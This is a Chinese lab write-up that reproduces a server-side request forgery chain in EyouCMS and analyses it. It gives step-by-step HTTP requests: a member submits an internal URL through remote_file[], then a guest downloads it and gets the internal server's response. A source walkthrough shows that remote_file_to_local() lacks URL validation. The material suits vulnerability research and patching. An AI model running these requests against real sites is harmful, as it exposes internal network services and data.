## 一.环境模拟
```plain
启动服务：
E:/php_portable/php74/php.exe -S 127.0.0.1:8803 -t E:/claude_project/web_cve/targets/eyoucms/src


模拟启动内网机密服务：
cd E:/claude_project/web_cve/targets/eyoucms/secret_server
E:/php_portable/php74/php.exe -S 127.0.0.1:8877 router.php
```



站点：
![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789803505722-bc7af0a6-063a-4fb1-8188-effc9c6e0dc6.png)



内网服务：
![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789803512362-09c8e2d6-f84a-497f-860e-98424b425bf2.png)

## 二.漏洞复现
### 1.注册会员拿cookie
![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789805340327-19dbfb1d-7de8-4959-9585-b242a02a4bd0.png)
登录获取cookie值![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789805316428-95771ca8-3d17-4617-a733-e243ef435ddf.png)

```plain
Cookie: home_lang=cn; PHPSESSID=uu60rndgi108m9anu4m7a002ic; referurl=http%3A%2F%2F127.0.0.1%3A8803%2F%3Fm%3Duser%26amp%3Bc%3DUsers%26amp%3Ba%3Dreg; admin_lang=cn; users_id=1; left_menu_2024=0
```



### 2.取动态token
访问[http://127.0.0.1:8803/index.php?m=user&c=UsersRelease&a=article_add&channel=4&typeid=5](http://127.0.0.1:8803/index.php?m=user&c=UsersRelease&a=article_add&channel=4&typeid=5)

查看返回包找到token
![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789807511501-d52ed9ac-1503-41bc-a9de-74bdd1a3b47a.png)

```plain
                                            <input type='hidden'
                                            name='__token__dbd5551ae523f680a4adf83f01e27779' 
                                            value='f3c1bca8c020ff88e64dc8175fde2b52'/>
```



### 3.注入内网URL
```plain
POST /index.php?m=user&c=UsersRelease&a=article_add HTTP/1.1
Host: 127.0.0.1:8803
Cookie: PHPSESSID=uu60rndgi108m9anu4m7a002ic; home_lang=cn
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

typeid=5&channel=4&title=poc-1&origin=network&addonFieldExt[content]=poc&__token__dbd5551ae523f680a4adf83f01e27779=f3c1bca8c020ff88e64dc8175fde2b52&remote_file[]=http://127.0.0.1:8877/poc.txt


![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789807736907-41c7c274-1cee-41e7-b2ad-2b3e5ad771f3.png)
```







### 4.**<font style="color:rgb(51, 51, 51);">取 file_id 和 uhash</font>**
编辑投稿可以看到url里的aid
![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789807816083-72b24fc8-0f82-4538-a0bd-75f30d09fa64.png)

这里是111

访问[http://127.0.0.1:8803/index.php?m=user&c=UsersRelease&a=article_edit&aid=111&channel=4](http://127.0.0.1:8803/index.php?m=user&c=UsersRelease&a=article_edit&aid=109&channel=4)（注意aid是获取的aid）

找到其get请求，观察其返回包

在返回包里获得file_id和uhash
![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789807991593-59b930d1-eb56-4b8b-8d0d-cb96aef0ad7f.png)

```plain
                    var downfile_list = '[{"file_id":81,"aid":111,"title":"poc-1","file_url":"http:\/\/127.0.0.1:8877\/poc.txt","extract_code":"","file_size":"0","file_ext":"","file_name":"","server_name":"","file_mime":"","uhash":"dc48cbac7642f492fe9e6e3621199953","md5file":"dc48cbac7642f492fe9e6e3621199953","is_remote":1,"downcount":0,"sort_order":1,"add_time":1789807721,"update_time":0}]';
```



### 5.游客触发**<font style="color:rgb(51, 51, 51);">（不带 Cookie）</font>**
故意不带cookie

```plain
GET /index.php?m=home&c=View&a=downfile&id=换成file_id&uhash=换成uhash HTTP/1.1
Host: 127.0.0.1:8803
```

返回302

记录返回包
![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789808079780-251df159-48be-47a6-a01b-0675ef0a2660.png)

```plain
HTTP/1.1 302 Found
Host: 127.0.0.1:8803
Date: Sat, 19 Sep 2026 08:54:27 GMT
Connection: close
X-Powered-By: PHP/7.4.33
Set-Cookie: home_lang=cn; path=/; SameSite=Lax
Set-Cookie: PHPSESSID=q13anghhft1i6utql029ure5r9; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Set-Cookie: users_id=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Set-Cookie: site_info=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Set-Cookie: home_lang=cn; path=/; SameSite=Lax
Set-Cookie: 81ac07VlYGAQMAAwUIA1hfVQYJCFcMBVNUBwACUllWBwFcBlYHBQEHBwJVAQEBBwNdUgdcVQIHVVNaCQhUCw=1; path=/; SameSite=Lax
Content-Type:text/html; charset=utf-8
Cache-control:no-cache,must-revalidate
Location:http://127.0.0.1:8803/index.php?m=home&c=View&a=download_file&file_id=81&uhash=ac07VlYGAQMAAwUIA1hfVQYJCFcMBVNUBwACUllWBwFcBlYHBQEHBwJVAQEBBwNdUgdcVQIHVVNaCQhUCw


```



### 6.**<font style="color:rgb(51, 51, 51);">跟随跳转拿到内网响应体</font>**
发包

```plain
  GET /index.php?m=home&c=View&a=download_file&file_id=81&uhash=这次的加密串 HTTP/1.1
  Host: 127.0.0.1:8803
  Cookie: PHPSESSID=上一步的值; home_lang=cn; 81ac07VlYGAQMAAwUI...=上一步它的value
![](https://cdn.nlark.com/yuque/0/2026/png/61203227/1789808932071-a480d26d-6886-4be8-83a9-55cf364231e0.png)
```



## 三.源码分析
<font style="color:rgb(51, 51, 51);">漏洞由四道"各自看起来合理"的防线串联失效构成。先看链路鸟瞰，再逐环引用源码讲解：</font>

```plain
攻击者注册会员
   │ ① 投稿 POST article_add   remote_file[]=http://内网地址/poc.txt
   ▼
 入库：URL 零校验，uhash=md5(url)            ← 注入点（3.1）
   │ ② 游客 GET downfile?id=&uhash=
   ▼
 downfile：不查稿件状态、外链视为存在          ← 触发点（3.2）
   │ ③ 扩展名是 .txt → 走"本地化"分支
   ▼
 remote_file_to_local()：全站唯一没调
 validateRemoteUrl() 的远程抓取函数           ← Sink（3.4）
   │ get_headers → readfile → 落盘 uploads/soft/
   ▼ ④ 302 → download_file
 回读：把存下来的"内网响应"原样给游客          ← 危害兑现（3.5）
```

### <font style="color:rgb(51, 51, 51);">3.1 注入点：会员投稿 remote_file[] 零校验入库</font>
`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/user/model/DownloadFile.php:105-125</font>`<font style="color:rgb(51, 51, 51);">（会员投稿保存下载附件的实际代码）：</font>

```plain
if (!empty($post['remote_file'])) {
     foreach($post['remote_file'] as $kkk => $vvv)
     {
         $vvv = trim($vvv);                     // ← 对 URL 唯一的"处理"
         if($vvv == null || empty($vvv)) continue;
         ...
         'file_url'   => $vvv,                  // ← 直接入库 ey_download_file
         'uhash'      => md5($vvv),             // ← "防伪哈希" = md5(URL 本身)
         'is_remote'  => 1,
```

<font style="color:rgb(51, 51, 51);">对 URL 的全部"校验"只有 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">trim()</font>`<font style="color:rgb(51, 51, 51);">：没有协议白名单、没有域名限制、没有内网地址检查。</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">uhash=md5($vvv)</font>`<font style="color:rgb(51, 51, 51);"> 本意是让下载链接不可伪造，但 URL 是攻击者自己填写的，md5 可自行计算——该防线对攻击者无效。</font>

### <font style="color:rgb(51, 51, 51);">3.2 触发点：游客可达的 downfile()</font>
`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/home/controller/View.php:363-406</font>`<font style="color:rgb(51, 51, 51);">：</font>

```plain
$map = array('a.file_id' => $file_id, 'a.uhash' => $uhash);
 $result = Db::name('download_file')
     ->join('__ARCHIVES__ b', 'a.aid = b.aid', 'LEFT')
     ->where($map)->find();
 ...
 if (empty($result) || (!is_http_url($result['file_url']) && !file_exists(...))) {
     $this->error('下载文件不存在！');
```

<font style="color:rgb(51, 51, 51);">三处"放行"：</font>

+ <font style="color:rgb(51, 51, 51);">JOIN 了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ey_archives</font>`<font style="color:rgb(51, 51, 51);"> 却</font>**<font style="color:rgb(51, 51, 51);">不按 </font>**`**<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">arcrank</font>**`**<font style="color:rgb(51, 51, 51);">/</font>**`**<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">is_del</font>**`**<font style="color:rgb(51, 51, 51);"> 过滤</font>**<font style="color:rgb(51, 51, 51);">——待审核、已删除稿件照样可触发（前台正常访问同稿返回 404，预期访问控制存在，此处遗漏）；</font>
+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">!is_http_url(...) && !file_exists(...)</font>`<font style="color:rgb(51, 51, 51);">：URL 为 http 开头即短路 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">file_exists</font>`<font style="color:rgb(51, 51, 51);">，外链直接视为"文件存在"；</font>
+ <font style="color:rgb(51, 51, 51);">会员等级/付费闸门仅在 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">is_download_pay</font>`<font style="color:rgb(51, 51, 51);"> 插件开启或 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">arc_level_id>0</font>`<font style="color:rgb(51, 51, 51);"> 时生效，默认下载栏目两者均关/为 0，游客畅通。</font>

### <font style="color:rgb(51, 51, 51);">3.3 分支决策：扩展名白名单</font>
`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/home/controller/View.php:509-512</font>`<font style="color:rgb(51, 51, 51);">：</font>

```plain
$url_arr = explode('.', $result['file_url']);
 $ext = $url_arr[count($url_arr)-1];
 $image_ext_arr = array_merge($image_ext_arr, ['txt']);
 if (in_array($ext, $image_ext_arr)){
     $result['file_url'] = remote_file_to_local($result['file_url']);   // ← Sink
```

<font style="color:rgb(51, 51, 51);">设计意图良性（站长贴的外链图片/txt 本地化缓存，避免外站资源失效），但"是否抓取"的决定被交给</font>**<font style="color:rgb(51, 51, 51);">扩展名字符串</font>**<font style="color:rgb(51, 51, 51);">：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">.txt</font>`<font style="color:rgb(51, 51, 51);"> 只是一个后缀，</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">http://127.0.0.1:8877/poc.txt</font>`<font style="color:rgb(51, 51, 51);"> 与真实图床在服务端看来没有任何区别。</font>**<font style="color:rgb(51, 51, 51);">扩展名不是安全边界，URL 的目标才是</font>**<font style="color:rgb(51, 51, 51);">——而目标从未被检查。</font>

### <font style="color:rgb(51, 51, 51);">3.4 Sink：remote_file_to_local() 全站唯一未校验的远程抓取函数</font>
<font style="color:rgb(51, 51, 51);">EyouCMS 为修复历史 SSRF（CVE-2025-15373 一类）在所有远程抓取函数中加入了统一校验函数 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">validateRemoteUrl()</font>`<font style="color:rgb(51, 51, 51);">：</font>

```plain
application/function.php:1654   saveRemote()          → validateRemoteUrl($imgUrl)   ✔ 已校验
 application/function.php:1997   saveRemoteVideo()     → validateRemoteUrl($videoUrl) ✔ 已校验
 application/function.php:2262   saveRemoteFile()      → validateRemoteUrl($fileUrl)  ✔ 已校验
 application/function.php:4070   (Ueditor/远程图片)     → validateRemoteUrl($imgUrl)   ✔ 已校验
 application/function.php:3825   remote_file_to_local() → 【无任何校验】               ✘ 遗漏
```

`**<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">remote_file_to_local()</font>**`**<font style="color:rgb(51, 51, 51);">（</font>**`**<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/function.php:3825</font>**`**<font style="color:rgb(51, 51, 51);">）是唯一没有调用 </font>**`**<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">validateRemoteUrl()</font>**`**<font style="color:rgb(51, 51, 51);"> 的远程抓取函数</font>**<font style="color:rgb(51, 51, 51);">，对传入 URL 仅做：</font>

1. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/function.php:3875</font>`<font style="color:rgb(51, 51, 51);"> 本站/第三方存储域名的正则跳过（内部 IP 不匹配，直接放行）；</font>
2. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/function.php:3880</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">^http(s?)://</font>`<font style="color:rgb(51, 51, 51);"> 格式检查——只查"长得像 URL"；</font>
3. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/function.php:3883</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">get_headers()</font>`<font style="color:rgb(51, 51, 51);"> 死链检查——只看 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">heads[0]</font>`<font style="color:rgb(51, 51, 51);"> 是否含 "200"，回答的是"链接活着吗"而非"目标合法吗"（</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">get_headers($url)</font>`<font style="color:rgb(51, 51, 51);"> 这一发请求本身即是服务器代发的 SSRF）；</font>
4. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/function.php:3903</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">readfile($imgUrl, false, $context)</font>`<font style="color:rgb(51, 51, 51);"> 完整抓取响应体；</font>
5. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/function.php:3921</font>``<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">file_put_contents()</font>`<font style="color:rgb(51, 51, 51);"> 将响应体保存到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">uploads/soft/日期/</font>`<font style="color:rgb(51, 51, 51);"> 下并返回本地 URL——</font>**<font style="color:rgb(51, 51, 51);">内网内容被搬到公网可直接下载的目录</font>**<font style="color:rgb(51, 51, 51);">。</font>

### <font style="color:rgb(51, 51, 51);">3.5 回读：download_file 会话校验只防第三者</font>
`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">application/home/controller/View.php:586-589</font>`<font style="color:rgb(51, 51, 51);">：</font>

```plain
$value = cookie($file_id.$uhash_mch);   // 读名为 "{file_id}{加密uhash}" 的专用 Cookie
 if (empty($value)) {
     $this->error('下载地址已失效，请在下载详情页进行下载！', $arcurl);
 }
```

`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">downfile</font>`<font style="color:rgb(51, 51, 51);"> 的 302 响应会 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Set-Cookie</font>`<font style="color:rgb(51, 51, 51);"> 该专用 Cookie，</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">download_file</font>`<font style="color:rgb(51, 51, 51);"> 校验其存在——属于防第三方直跳的防盗链设计，不防攻击者本人：其自己发起 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">downfile</font>`<font style="color:rgb(51, 51, 51);">、自带 Cookie 回读，内网响应体原样到手。</font>

